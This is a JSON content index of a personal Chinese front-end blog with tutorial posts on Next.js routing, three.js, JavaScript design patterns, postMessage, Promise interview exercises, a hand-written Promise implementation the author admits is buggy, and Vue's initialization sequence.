{"meta":{"title":"SoulReader","subtitle":"勤劳刻苦","description":"前端小菜鸟,努力深造","author":"lxx","url":"https://lxxstar987.gitee.io/lxx1997.github.io"},"posts":[{"title":"服务端 渲染 - nextjs","date":"2021-09-14T14:31:56.000Z","path":"2021/09/14/ssr-nextjs-01/","text":"初始化项目123npx create-next-app# oryarn create next-app 如果想要添加特殊配置有以下选择 --ts，--typescript 使用TypeScript -e，--example [name][github-url]使用样例 --example-path --use-npm 应用页面路由 Routernextjs 路由匹配规则 /pages/example.js | /pages/example/index.js 匹配路由 /example /pages/example/[id].js 匹配路由 /example/1 /pages/example/[...args].js 匹配路由 /example/1/2.../n /pages/example/[[...args]].js 匹配路由 /example/.../n 12345678// /example/[id].js// 路由为 /example/1import &#123; useRouter &#125; from &quot;next/dist/client/router&quot;;const Index = (): JSX.Element =&gt; &#123; const router = useRouter() const query = router.query // &#123;id: 1&#125;&#125;","tags":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/JavaScript/"},{"name":"SSR","slug":"SSR","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/SSR/"},{"name":"nextJs","slug":"nextJs","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/nextJs/"},{"name":"React","slug":"React","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/React/"}]},{"title":"threeJs 学习之路 - API 及 参数传递","date":"2021-08-15T01:53:24.000Z","path":"2021/08/15/threeJs-study-api/","text":"THREE.Scene() 创建场景对象方法 add 添加物体，会被添加到坐标为 (0, 0, 0)的位置上 THREE.PerspectiveCamera() 这个对象是 threeJs 中相机的其中一种 透视摄像机参数有四个 视野角度 表示在显示器上看到的场景的范围，值是一个角度（值会 mod 360） 长宽比 长宽比的值会影响我们渲染物体的是否是正常的还是拉伸的，压扁的 远剪切面 近剪切面 物体所在的位置比摄像机的远剪切面远或者所在位置比近剪切面近的时候，该物体超出的部分将不会被渲染到场景中，根据我们渲染的物体的z轴的值和摄像机的z轴位置来决定的 THREE.WebGLRenderer() 创建一个渲染器实例属性 domElement 渲染器生成的dom元素，通过 appendChild 方法插入到页面中 setSize(width, height, updateStyle) 第二个参数决定是否以较低的分辨率来渲染 render(scene, camera) 渲染场景和摄像机","tags":[]},{"title":"threeJs 学习之路 - 创建画布及绘制图形","date":"2021-08-15T01:38:18.000Z","path":"2021/08/15/threeJs-study-01/","text":"因为threeJs 版本在不断更新，所以本文可能部分 api 被替换，如果出现问题，请百度或者查找官方文档对应api 初始化引入引入的话可以采用 npm 引入 或者直接通过 CDN 方式引入 npm 引入 123456npm install three// 引入const THREE = require(&quot;three&quot;)import THREE from &quot;three&quot; CDN 方式引入 CDN地址 1&lt;script src=&quot;https://cdn.bootcdn.net/ajax/libs/three.js/r128/three.js&quot;&gt;&lt;/script&gt; 创建画布 12345678910// 创建场景const scene = new THREE.Scene()// 创建一个摄像机const camera = new THREE.PerspectiveCamera(50, window.innerWidth/window.innerHeight, 1, 1000)// 实例化渲染器const renderer = new THREE.WebGLRenderer()// 设置渲染大小renderer.setSize(window.innerWidth, window.innerHeight)renderer.render(scene, camera)document.body.appendChild(renderer.domElement) 编写完上述代码后应该会出现一个黑色区域，这个就是threeJs创建的 canvas 画布 绘制元素绘制一个正方体 创建一个立方体 需要一个 BoxGeometry 对象，这个对象包含了立方体所有的定点(vertices)和面(faces) 然后对于这个立方体给一个材质，这里我们采用 MeshBasicMaterial 方法，并设置一个默认颜色 接下来需要一个网格（Mesh），这个网格包含了 几何体及其材质的对象，然后通过 Scene 中的 add 方法添加到页面上，如果与摄像机重叠，还需要移动摄像机的位置 最后通过 WebGLRenderer 的 render 方法渲染 如果想要动起来，这个时候需要我们更改摄像机或者立方体的位置,并通过定时器函数，重新渲染 123456789101112131415161718var geometry = new THREE.BoxGeometry()var material = new THREE.MeshBasicMaterial(&#123;color: 0x00ff00&#125;)let cube = new THREE.Mesh(geometry, material)camera.position.z = 5// scene 为之前创建的 THREE.Scene() 实例scene.add(cube)// renderer.render(scene, camera)function render() &#123; requestAnimationFrame(render) // 立方体旋转 旋转速度 cube.rotation.x += 0.1 cube.rotation.y += 0.1 // 修改摄像机的位置 // camera.position.set(x, y, z) renderer.render(scene, camera)&#125;render() 绘制线条 对于绘制线条 我们可以选择的材质只有 LineBasicMaterial 和 LineDashedMaterial 定义好材质之后，我们需要一个带有定点的 Geometry 或者 BufferGeometry 然后通过 THREE.Vector3(x, y, z) 定义线条的顶点，线条是画在连续的顶点之间的 最后 通过 THREE.Line(geometry, material) 将材质和顶点联系起来 ~~~js // LineDashedMaterial 创建 虚线性的 线条 // LineBasicMaterial 创建 实线线条 const material = new THREE.LineDashedMaterial({color: 0x0000ff}) const points = [] // 创建 3d 线条的各个顶点 points.push(new THREE.Vector3(-10, 0, 20)) points.push(new THREE.Vector3(0, 10, 20)) points.push(new THREE.Vector3(10, 0, 20)) // 通过 setFromPoints 设置线条的顶点 const geometry = new THREE.BufferGeometry().setFromPoints(points) // 创建线条治理 const line = new THREE.Line(geometry, material) ~~·","tags":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/JavaScript/"},{"name":"threeJs","slug":"threeJs","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/threeJs/"},{"name":"webgl","slug":"webgl","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/webgl/"}]},{"title":"JavaScript 设计模式联系  -  创建型设计模式","date":"2021-06-14T10:25:20.000Z","path":"2021/06/14/design-parttern-01/","text":"简单工厂模式 简单工厂模式(Simple Factory) 又叫静态工厂模式，由一个工厂对象决定创建摸一种产品对象类的实例 简单工厂模式的理念就是创建对象，提取多个类似需求中相同部分，针对不同的地方进行特殊处理 1234567891011121314151617181920function factory(object) &#123; const Factory = new Object() // 相同的部分 Factory.name = object.name Factory.age = object.name // 不同的部分 switch(object.type) &#123; case &#x27;type1&#x27;: // 特殊处理 break; case &#x27;type2&#x27;: // 特殊处理 break; default: break; &#125; return Factory&#125; 工厂方法模式 工厂方法模式(Factory Methods) 通过对产品类的抽象使其创建业务，主要负责用于创建多累产品的实例 工厂方法模式的本意是将时间创建对象工作推迟到了子类当中，这样核心类就成为了抽象类，在使用工厂方法模式时，需要使用安全策略来防止我们每次获取到的不是想要的对象 安全策略1234567function Factory() &#123; if(this instanceof Factory) &#123; return this &#125; else &#123; return new Factory() &#125;&#125; 通过以上代码在实例化对象的时候判断一下是否是创建对象实例，如果不是则返回一个新的实例，以便能获取到预期的对象 工厂方式模式代码1234567891011121314151617function Factory(type, content) &#123; if(this instanceof Factory) &#123; return this[type](content) &#125; else &#123; return new Factory(type, content) &#125;&#125;Factory.prototype.Car = &#123;&#125;Factory.prototype.Pat = &#123; &#125;Factory.prototype.Clothes = &#123; &#125; 抽象工厂模式 抽象工厂模式(Abstract Factory) 通过对类的工厂抽象使其业务用于产品类簇的创建，而不是创建某一类产品的实例 抽象类工厂其实是实现子类继承父类的方法，我们需要通过传递子类以及要继承父类的名称，并且在抽象工厂方法中增加一次对抽象类存在性的判断，如果存在，子类继承父类的方法。子类继承了父类的所有的属性和方法，如果子类中没有方法或者属性覆盖父类方法，当调用的时候，会直接返回父类的属性和方法。 抽象类工厂的主要作用是，当子类调用了自己本身不存在且不需要的方法是，会给予提示 12345678910111213141516171819202122232425262728293031323334353637function Abstract(child, parent) &#123; if(typeof Abstract[parent] === &#x27;function&#x27;) &#123; // 定义一个空的父类 function F() &#123;&#125; F.prototype = new Abstract[parent]() child.constructor = child child.prototype = new F() &#125; else &#123; throw new Error(&#x27;未找到改抽象类&#x27;) &#125;&#125;Abstract.Car = function() &#123; this.type = &#x27;car&#x27;&#125;Abstract.Car.prototype = &#123; getName: function () &#123; throw Error(&#x27;抽象类方法无法调用&#x27;) &#125;, getPrice: function() &#123; throw Error(&#x27;抽象类方法无法调用&#x27;) &#125;&#125;function Aodis() &#123; this.name = &#x27;aodi&#x27; this.price = 12312&#125;Abstract(Aodis, &#x27;Car&#x27;)console.log(Aodis)Aodis.prototype.getName = function() &#123; console.log(this.name)&#125;const aodi = new Aodis()aodi.getName()aodi.getPrice() 抽象类 抽象类是一种声明了但是无法使用的类，当你调用抽象类的方法时就会报错，我们可以手动在类型的方法中进行错误提示 123456789function Abstract() &#123;&#125;Abstract.prototype = &#123; getName() &#123; console.log(&#x27;抽象方法无法使用！！！&#x27;) &#125;, getPrice() &#123; console.log(&#x27;抽象方法无法使用！！！&#x27;) &#125;&#125; 当我们通过继承或者直接使用的方式来调用抽象类中方法时，会直接抛出错误","tags":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/JavaScript/"}]},{"title":"window.postMessage跨域的使用方式","date":"2021-05-04T15:23:18.000Z","path":"2021/05/04/window-postMessage跨域的使用方式/","text":"最近忙着工作的事情，好久没有更新博客了，正好最近要做的一个功能，最后决定使用 postMessage 进行解决 具体的使用场景是我这边打开新的窗口的时候需要向新的窗口传递一些数据 首先从网上摘取一些针对 postMessage 介绍 window.postMessage() 方法可以安全地实现跨源通信。通常，对于两个不同页面的脚本，只有当执行它们的页面位于具有相同的协议（通常为https），端口号（443为https的默认值），以及主机 (两个页面的模数 Document.domain设置为相同的值) 时，这两个脚本才能相互通信。window.postMessage() 方法提供了一种受控机制来规避此限制，只要正确的使用，这种方法就很安全。 父窗口如何传递参数打开窗口的方式有一下几种 iframe的contentWindow属性、执行window.open返回的窗口对象、或者是命名过或数值索引的window.frames,此处暂时先介绍 window.open() 父窗口获取打开新窗口对象 1const open = window.open(&#x27;http://www.baidu.com&#x27;, &quot;_blank&quot;) postMessage 有三个参数1open.postMessage(message, targetOrigin, [transfer]); message 是传递的数据 一般来说是一个对象用来传递当前postMessage类型，以及要传递的数据，因为可以通过 postMessage 多次传递，但是调用的事件监听方法都是同一个，所以最好要加一个状态进行区分 targetOrigin 代表接受域名， 可以是 &quot;*&quot; 代表所有域名都可以，也可以是一个url，代表特定域名可以接受 transfer 是一串和message 同时传递的 Transferable 对象. 这些对象的所有权将被转移给消息的接收方，而发送一方将不再保有所有权。 postMessage 在使用的时候需要在需要接收数据的窗口中定义一个事件监听函数 message, 注意这个方法需要挂载到 ·indow 上面, 我最开始给挂载到 document, 结果怎么都触发不了，尴尬 postMessage 传递的 message 数据在 回调函数参数的 data上 123window.addEventListener(&#x27;message&#x27;, (res) =&gt; &#123; console.log(res)&#125;) 子窗口获取父窗口 window.opener 方法 message 回到函数参数的 resource 属性，返回父窗口的引用 问题 使用window.open 打开新窗口会被拦截？ 12const open = window.open(&#x27;about:blank&#x27;)open.location.href = &quot;http://www.baidu.com&quot;","tags":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/JavaScript/"}]},{"title":"记一次在面试过程中遇到的 promise 编程题","date":"2021-04-01T08:25:13.000Z","path":"2021/04/01/面试-题解/","text":"当时面试的时候遇到了这两个函数编程题，但是该死的是完全没有思路(悲伤) 利用 Promise 完成一个队列，队列中的任务数满了的话，后续任务不执行，当队列中的任务有完成的状态，才会添加新的任务进入队列 利用 Promise 完成一个 retry 函数，传入一个执行函数和一个计数器，在一定次数范围内，如果函数执行失败的话会再次尝试执行该函数，直到执行成功 面试结束之后，我上网上搜索了一下类似的问题，接下来是我总结之后的思路，以及最后成功的代码 Promise 队列 这个问题有以下几个重点 队列： 存放未执行的任务队列 计数器： 存放当前正在执行的任务数量 任务执行最大数量 添加任务函数 执行任务函数 接下根据我们上述描述的重点来创建一个任务队列执行类 1234567891011121314class Scheduler &#123; // 初始化任务队列，以及根据传入的数量来限制最大执行数量 constructor(maxCount) &#123; this.maxCount = count this.list = [] this.count = 0 &#125; add() &#123; &#125; start() &#123; &#125;&#125; 接下我们就要来编写添加函数了，在写添加函数之前我们首先思考一下这个添加函数里面应该注意那些东西 首先，如果我们想要在任务执行完成之后对执行结果操作的话，这个 add 函数必须返回一个 promise 函数 12345add(task) &#123; return new Promise(resolve =&gt; &#123; resolve() &#125;)&#125; 添加一个任务的时候，我们需要把这个任务添加到未执行的任务队列的存放起来 1234567add(task) &#123; return new Promise(resolve =&gt; &#123; resolve(() =&gt; &#123; this.list.push(task()) &#125;) &#125;)&#125; 这个时候就出现了一个问题，我们应该怎样监控这个任务是否已经执行完成，这个时候 promise 的作用就来了，我们在 then 中就可以判断到函数是否执行成功 123456789add(task) &#123; return new Promise(resolve =&gt; &#123; resolve(() =&gt; &#123; this.list.push(Promise.resolve(task()).then()) // 如果 task 执行之后的返回值是一个promise对象则可以修改成以下形式 // this.list.push(task().then()) &#125;) &#125;)&#125; 添加函数先写到这里，然后我们来写执行函数，在start函数中我们需要做的就是判断一下正在执行任务数是否小于最大执行数，然后从待执行队列中取出一个任务并执行，然后将正在执行的任务数加上1 123456start() &#123; if(this.count &lt; this.maxCount) &#123; this.count++ this.list[0] &amp;&amp; this.list.shift()() &#125;&#125; 接下来修改 add 函数 为当我们添加一个任务时，在最后执行一下执行函数，在执行任务完成之后，减少执行队列数，并触发执行函数，最后把任务的返回值 return 出来 123456789101112add(task) &#123; return new Promise(resolve =&gt; &#123; this.list.push(() =&gt; &#123; resolve(Promise.resolve(task()).then(s =&gt; &#123; this.count-- this.start() return s &#125;)) &#125;) this.start() &#125;)&#125; 接下来实例化任务队列，并创建一个异步执行方法和一个添加任务函数 123456789101112let scheduler = new Scheduler(5)let timeout = (time) =&gt; &#123; return new Promise(resolve =&gt; &#123; setTimeout(resolve, time) &#125;)&#125;let addTask = function addTask(time, order) &#123; scheduler.add(() =&gt; timeout(time)).then(() =&gt; &#123; console.log(time, order) &#125;)&#125; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849class Scheduler &#123; constructor(count) &#123; this.list = [] this.maxCount = count this.count = 0 &#125; add(task) &#123; return new Promise(resolve =&gt; &#123; this.list.push(() =&gt; &#123; resolve(Promise.resolve(task()).then(s =&gt; &#123; this.count-- this.start() return s &#125;)) &#125;) this.start() &#125;) &#125; start() &#123; console.log(this.count) if(this.count &lt; this.maxCount) &#123; this.count++ this.list[0] &amp;&amp; this.list[0]() this.list.shift() &#125; &#125;&#125;let scheduler = new Scheduler(5)let timeout = (time) =&gt; &#123; return new Promise(resolve =&gt; &#123; setTimeout(resolve, time) &#125;)&#125;let addTask = function addTask(time, order) &#123; scheduler.add(() =&gt; timeout(time)).then(() =&gt; &#123; console.log(time, order) &#125;)&#125;addTask(5000,&#x27;1&#x27;)addTask(1100,&#x27;2&#x27;)addTask(2200,&#x27;3&#x27;)addTask(3300,&#x27;4&#x27;)addTask(3300,&#x27;5&#x27;)addTask(3300,&#x27;6&#x27;)addTask(3300,&#x27;7&#x27;)addTask(2200,&#x27;8&#x27;) Promise retry 函数 function retry(fun, count) { if(count === 0) return let val = fun() if(val &gt; 3) { return val } else { return retry(fun, –count) }} function random() { return Math.random() * 5}console.log(retry(random, 5)) 这个问题现在看起来挺简单的，但是当时估计相差了，思路都理解错了，难受","tags":[{"name":"promise","slug":"promise","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/promise/"},{"name":"面试","slug":"面试","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/%E9%9D%A2%E8%AF%95/"}]},{"title":"JavaScript - 手写一个 Promise 方法","date":"2021-03-18T05:15:52.000Z","path":"2021/03/18/js-promise/","text":"ES6新增了一个用于处理异步操作数据的一个原生API，能够解决回调地狱的产生 常用的方法 Promise.resolve() Promise.reject() Promise.then() Promise.catch() Promise.finally() Promise.all() Promise.race() Promise.allSettled() Promise.any() 接下来我们来使用代码来实现这些操作 实现Promise 首先我们在创建 Promise 实例，会传入两个函数用来表示成功的回调以及失败的回调，然后我们可以设计 Promise 类中的内容大概是这个样子的 12345678910111213141516171819202122232425262728293031const PANDING = &#x27;panding&#x27;const FULFILLED = &#x27;fulfilled&#x27;const REJECTED = &#x27;rejected&#x27;class Promise &#123; constructor(fn) &#123; this.state = PANDING this.resolveVal = null this.rejectVal = null fn(this.resolve.bind(this), this.reject.bind(this)) &#125; resolve(value) &#123; let s = setInterval(() =&gt; &#123; if(this.state !== PANDING) &#123; s &amp;&amp; clearInterval(s) return &#125; this.state = FULFILLED this.resolveVal = value || this.resolveVal &#125;,4) &#125; reject(value) &#123; let s = setInterval(() =&gt; &#123; if(this.state !== PANDING) &#123; s &amp;&amp; clearInterval(s) return &#125; this.state = REJECTED this.rejectVal = value || this.rejectVal &#125;) &#125;&#125; 这样就实现了一个简单的Promise方法，并且更改状态之后就不可以在修改状态了,并且用两个变量来接收resolve和reject两个方法传入的值 Promise.then 1234567891011121314151617181920Promise.prototype.then = function(resolve, reject) &#123; let s = setInterval(() =&gt; &#123; if(this.state !== PANDING) &#123; s &amp;&amp; clearInterval(s) try &#123; let success = null let fail = null // 判断 传入参数的类型并绑定this typeof resolve === &#x27;function&#x27; &amp;&amp; (success = getReturn(resolve.call(this, this.resolveVal))) typeof reject === &#x27;function&#x27; &amp;&amp; (fail = getReturn(reject.call(this, this.rejectVal))) if(success) return Promise.resolve(success) if(fail) return Promise.resolve(fail) return this &#125; catch (error) &#123; return Promise.reject(error) &#125; &#125; &#125;,4)&#125; 调用 then 方法时判断一下传入的是否是函数，如果是函数就直接调用，并把成功的参数传入最后的 return this 则是为了实现链式结构 Promise.catch 12345678910111213141516171819Promise.prototype.catch = function(reject) &#123; let s = setInterval(() =&gt; &#123; if(this.state !== PANDING) &#123; s &amp;&amp; clearInterval(s) try &#123; try &#123; let fail = null typeof reject === &#x27;function&#x27; &amp;&amp; (fail = getReturn(reject.call(this, this.rejectVal))) if(fail) return Promise.resolve(fail) return this &#125; catch (error) &#123; return Promise.reject(error) &#125; &#125; catch (error) &#123; return Promise.reject(error) &#125; &#125; &#125;,4)&#125; Promise.finally 1234Promise.prototype.finally = function(fn) &#123; fn() return this&#125; Promise.resolve 1234Promise.resolve = function(value) &#123; if(value instanceof Promise) return value return new Promise((resolve) =&gt; &#123;resolve(value)&#125;)&#125; 这个稍微有些麻烦，我们需要判断传入的 value 是不是 Promise 类型的，如果是就可以直接返回，然后调用 .then 等方法，否则就需要我们创建一个 Promise 实例并返回 Promise.reject 1234Promise.reject = function(value) &#123; if(value instanceof Promise) return value return new Promise((resolve, reject) =&gt; &#123;reject(value)&#125;)&#125; 但是这里还有许多需要注意的地方，例如Promise.then中如果有 return 的话则需要以返回的状态和值为主，如果没有,就以上一次的状态和值为主同时还需要对代码使用 try...catch... 进行容错处理，使得在 catch 中能够拿到错误信息 代码修改如下12345678910111213141516171819Promise.prototype.then = function(resolve, reject) &#123; try &#123; let success = null let fail = null // 判断 传入参数的类型并绑定this typeof resolve === &#x27;function&#x27; &amp;&amp; (success = getReturn(resolve.call(this, this.resolveVal))) typeof reject === &#x27;function&#x27; &amp;&amp; (fail = getReturn(reject.call(this, this.rejectVal))) if(success) return Promise.resolve(success) if(fail) return Promise.resolve(fail) return this &#125; catch (error) &#123; return Promise.reject(error) &#125;&#125;function getReturn(val) &#123; if(typeof val === &#x27;function&#x27;) return val() return val&#125; 实现Promise高级语法 Promise.all 12345678910111213141516171819202122232425262728Promise.all = function(arr) &#123; try &#123; if(arr instanceof Array) &#123; return new Promise((resolve, reject) =&gt; &#123; let resolveVal = [] let isReject = false for(let i = 0; i &lt; arr.length; i++) &#123; let res = getReturn(arr[i]) if(res instanceof Promise) &#123; res.then(res1 =&gt; &#123; // 保证数组顺序返回正确 resolveVal[i] = res1 &#125;).catch(err =&gt; &#123; reject(err) isReject = true &#125;) &#125; else resolveVal.push(res) if(isReject) break &#125; resolve(resolveVal) &#125;) &#125; else throw new Error(&#x27;Promise.all must receive Array&#x27;) &#125; catch (error) &#123; if(error instanceof Error) throw error return Promise.reject(error) &#125;&#125; Promise.race 1234567891011121314151617181920212223242526272829Promise.race = function(arr) &#123; try &#123; if(arr instanceof Array) &#123; return new Promise((resolve, reject) =&gt; &#123; if(arr.length === 0) resolve() for(let i = 0; i &lt; arr.length; i++) &#123; let res = getReturn(arr[i]) if(res instanceof Promise) &#123; res.then(res1 =&gt; &#123; if(res1) &#123; resolve(res) &#125; &#125;).catch(err =&gt; &#123; if(err) &#123; reject(err) &#125; &#125;) &#125; else &#123; resolve(res) break; &#125; &#125; &#125;) &#125; else throw new Error(&#x27;Promise.all must receive Array&#x27;) &#125; catch (error) &#123; if(error instanceof Error) throw error return Promise.reject(error) &#125;&#125; promise.allSettled 123456789101112131415161718192021222324252627282930313233343536373839404142Promise.allSettled = function(arr) &#123; try &#123; if(arr instanceof Array) &#123; return new Promise((resolve, reject) =&gt; &#123; let resolveVal = [] let length = 0 if(arr.length === 0) resolve([]) for(let i = 0; i &lt; arr.length; i++) &#123; let res = getReturn(arr[i]) if(res instanceof Promise) &#123; res.then(res1 =&gt; &#123; if(res1) &#123; resolveVal[i] = &#123; status: FULFILLED, value: res1 &#125; if(++length === arr.length) resolve(resolveVal) &#125; &#125;).catch(err =&gt; &#123; if(err) &#123; resolveVal[i] = &#123; status: REJECTED, value: err &#125; if(++length === arr.length) resolve(resolveVal) &#125; &#125;) &#125; else &#123; resolveVal[i] = &#123; status: FULFILLED, value: res &#125; if(++length === arr.length) resolve(resolveVal) &#125; &#125; &#125;) &#125; else throw new Error(&#x27;Promise.all must receive Array&#x27;) &#125; catch (error) &#123; if(error instanceof Error) throw error return Promise.reject(error) &#125;&#125; 这些代码中还是有很多的bug 全部代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178const PANDING = &#x27;panding&#x27;const FULFILLED = &#x27;fulfilled&#x27;const REJECTED = &#x27;rejected&#x27;class Promise &#123; constructor(fn) &#123; this.state = PANDING this.resolveVal = null this.rejectVal = null fn(this.resolve.bind(this), this.reject.bind(this)) &#125; resolve(value) &#123; if(this.state !== PANDING) &#123; return &#125; this.state = FULFILLED this.resolveVal = value || this.resolveVal &#125; reject(value) &#123; if(this.state !== PANDING) &#123; return &#125; this.state = REJECTED this.rejectVal = value || this.rejectVal &#125;&#125;Promise.resolve = function(value) &#123; if(value instanceof Promise) return value return new Promise((resolve) =&gt; &#123;resolve(value)&#125;)&#125;Promise.reject = function(value) &#123; if(value instanceof Promise) return value return new Promise((resolve, reject) =&gt; &#123;reject(value)&#125;)&#125;Promise.all = function(arr) &#123; try &#123; if(arr instanceof Array) &#123; return new Promise((resolve, reject) =&gt; &#123; let resolveVal = [] let isReject = false for(let i = 0; i &lt; arr.length; i++) &#123; let res = getReturn(arr[i]) if(res instanceof Promise) &#123; res.then(res1 =&gt; &#123; resolveVal[i] = res1 &#125;).catch(err =&gt; &#123; reject(err) isReject = true &#125;) &#125; else resolveVal.push(res) if(isReject) break &#125; resolve(resolveVal) &#125;) &#125; else throw new Error(&#x27;Promise.all must receive Array&#x27;) &#125; catch (error) &#123; if(error instanceof Error) throw error return Promise.reject(error) &#125;&#125;Promise.race = function(arr) &#123; try &#123; if(arr instanceof Array) &#123; return new Promise((resolve, reject) =&gt; &#123; if(arr.length === 0) resolve() for(let i = 0; i &lt; arr.length; i++) &#123; let res = getReturn(arr[i]) if(res instanceof Promise) &#123; res.then(res1 =&gt; &#123; if(res1) &#123; resolve(res) &#125; &#125;).catch(err =&gt; &#123; if(err) &#123; reject(err) &#125; &#125;) &#125; else &#123; resolve(res) &#125; &#125; &#125;) &#125; else throw new Error(&#x27;Promise.all must receive Array&#x27;) &#125; catch (error) &#123; if(error instanceof Error) throw error return Promise.reject(error) &#125;&#125;Promise.allSettled = function(arr) &#123; try &#123; if(arr instanceof Array) &#123; return new Promise((resolve, reject) =&gt; &#123; let resolveVal = [] let length = 0 if(arr.length === 0) resolve([]) for(let i = 0; i &lt; arr.length; i++) &#123; let res = getReturn(arr[i]) if(res instanceof Promise) &#123; res.then(res1 =&gt; &#123; if(res1) &#123; resolveVal[i] = &#123; status: FULFILLED, value: res1 &#125; if(++length === arr.length) resolve(resolveVal) &#125; &#125;).catch(err =&gt; &#123; if(err) &#123; resolveVal[i] = &#123; status: REJECTED, value: err &#125; if(++length === arr.length) resolve(resolveVal) &#125; &#125;) &#125; else &#123; resolveVal[i] = &#123; status: FULFILLED, value: res &#125; if(++length === arr.length) resolve(resolveVal) &#125; &#125; &#125;) &#125; else throw new Error(&#x27;Promise.all must receive Array&#x27;) &#125; catch (error) &#123; if(error instanceof Error) throw error return Promise.reject(error) &#125;&#125;Promise.prototype.then = function(resolve, reject) &#123; let s = setInterval(() =&gt; &#123; if(this.state !== PANDING) &#123; s &amp;&amp; clearInterval(s) try &#123; let success = null let fail = null // 判断 传入参数的类型并绑定this typeof resolve === &#x27;function&#x27; &amp;&amp; (success = getReturn(resolve.call(this, this.resolveVal))) typeof reject === &#x27;function&#x27; &amp;&amp; (fail = getReturn(reject.call(this, this.rejectVal))) if(success) return Promise.resolve(success) if(fail) return Promise.resolve(fail) return this &#125; catch (error) &#123; return Promise.reject(error) &#125; &#125; &#125;,4)&#125;Promise.prototype.catch = function(reject) &#123; let s = setInterval(() =&gt; &#123; if(this.state !== PANDING) &#123; s &amp;&amp; clearInterval(s) try &#123; try &#123; let fail = null typeof reject === &#x27;function&#x27; &amp;&amp; (fail = getReturn(reject.call(this, this.rejectVal))) if(fail) return Promise.resolve(fail) return this &#125; catch (error) &#123; return Promise.reject(error) &#125; &#125; catch (error) &#123; return Promise.reject(error) &#125; &#125; &#125;,4)&#125;Promise.prototype.finally = function(fn) &#123; fn() return this&#125;function getReturn(val) &#123; if(typeof val === &#x27;function&#x27;) return val() return val&#125;","tags":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/JavaScript/"}]},{"title":"浅浅的剖析一下 Vue 的执行顺序","date":"2021-02-08T03:02:00.000Z","path":"2021/02/08/vue-learn-api-with-源码-implement/","text":"定义 Vue 构造函数1234567891011121314151617181920212223import &#123; initMixin &#125; from &#x27;./init&#x27;import &#123; stateMixin &#125; from &#x27;./state&#x27;import &#123; renderMixin &#125; from &#x27;./render&#x27;import &#123; eventsMixin &#125; from &#x27;./events&#x27;import &#123; lifecycleMixin &#125; from &#x27;./lifecycle&#x27;import &#123; warn &#125; from &#x27;../util/index&#x27;function Vue (options) &#123; if (process.env.NODE_ENV !== &#x27;production&#x27; &amp;&amp; !(this instanceof Vue) ) &#123; warn(&#x27;Vue is a constructor and should be called with the `new` keyword&#x27;) &#125; this._init(options)&#125;initMixin(Vue)stateMixin(Vue)eventsMixin(Vue) lifecycleMixin(Vue)renderMixin(Vue)export default Vue 定义了 一个 Vue 构造函数，这个构造函数传入的参数是 options，使用的时候通过 new 关键字来创建实例，然后调用了 _init 方法 根据传入的 options 配置来初始化 Vue 实例 初始化 initMixin1234567891011121314151617181920212223242526272829303132333435363738394041424344var uid$3 = 0;Vue.prototype._init = function (options) &#123; var vm = this; vm._uid = uid$3++; var startTag, endTag; // 是否记录 性能 if (config.performance &amp;&amp; mark) &#123; startTag = &quot;vue-perf-start:&quot; + (vm._uid); endTag = &quot;vue-perf-end:&quot; + (vm._uid); mark(startTag); &#125; vm._isVue = true; if (options &amp;&amp; options._isComponent) &#123; initInternalComponent(vm, options); &#125; else &#123; vm.$options = mergeOptions( resolveConstructorOptions(vm.constructor), options || &#123;&#125;, vm ); &#125; &#123; initProxy(vm); &#125; vm._self = vm; initLifecycle(vm); initEvents(vm); initRender(vm); callHook(vm, &#x27;beforeCreate&#x27;); initInjections(vm); // resolve injections before data/props initState(vm); initProvide(vm); // resolve provide after data/props callHook(vm, &#x27;created&#x27;); if (config.performance &amp;&amp; mark) &#123; vm._name = formatComponentName(vm, false); mark(endTag); measure((&quot;vue &quot; + (vm._name) + &quot; init&quot;), startTag, endTag); &#125; if (vm.$options.el) &#123; vm.$mount(vm.$options.el); &#125;&#125;; 通过上述代码，我们可以看到 Vue 在初始化的时候主要做了以下几件事 创建 Vue 实例 唯一标识符 _uid 根据 config 配置判断是否开启 性能监控 performance 设置 Vue 标识符 _isVue 为 true 代表当前实例是 Vue 实例 通过 option 的 _isComponents 属性判断当前 Vue 实例是否是组件，如果是组件就调用 initInternalComponent 函数，不是组件就调用 mergeOptions 方法，并将返回的参数赋予 Vue 实例的 $options 属性 调用 initProxy 方法，判断 proxy 代理是否存在，如果存在，使用 proxy 对 Vue 实例进行响应式监控和代理 设置 Vue 的 _self 属性 为自身实例 调用 initLifecycle 函数 初始化生命周期 调用 initEvents 方法 初始化事件对象 调用 initRender 方法 初始化渲染使用的方法 slot, scopedSlots, createElement, _c方法，并对 $attrs,$listeners 方法进行进行数据响应式处理 调用 beforeCreate 生命周期，由于此时 还没有任何数据或者方法挂载到 Vue 实例上，所以 无法访问 调用 initInjections 方法 初始化 inject 属性 调用 initState 方法 初始化 data,props,methods,computed,watch 属性，设置数据响应式处理，及将属性挂载到 Vue 实例上 调用 initProvide 方法 初始化 provide 属性 调用 created 生命周期，此时可以访问到 inject,data,props,methods,computed上属性的值 调用 $mount 方法 获取 元素节点 el 判断是否传入 render 函数，没有就初始化一个空 DOM 节点 调用 beforeMount 生命周期 设置 组件变化的监听方法，监听组件是否更新 设置 Vue 实例挂载状态为 true 调用 mounted 生命周期 stateMixin该函数主要针对 实例 $data, $props 进行数据响应式处理，不允许更新并且初始化实例 $set, $delete, $watch(并返回一个 撤销监听的方法) eventMixin初始化事件方法 $once, $on, $off, $emit lifecycleMixin初始化 _update, forceUpdate, destory 